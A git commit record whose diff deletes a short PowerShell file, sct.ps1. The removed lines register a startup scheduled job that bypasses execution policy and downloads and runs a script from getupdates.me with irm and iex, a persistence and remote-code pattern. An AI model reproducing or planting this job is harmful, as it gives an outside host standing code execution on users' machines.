686880099719d72bb8d595a2f34155f400cb0d61
kennethchow1 <103966331+kennethchow1@users.noreply.github.com>
2025-02-25 08:12:40 -0800

    Delete sct.ps1

--- sct.ps1
+++
@@ -1,2 +0,0 @@
-$trigger = New-JobTrigger -AtStartUp -RandomDelay 00:00:15
-Register-ScheduledJob -Trigger $trigger -ScriptBlock {pwsh -ExecutionPolicy unrestricted -C irm https://getupdates.me/test3.ps1 | iex} -Name Final
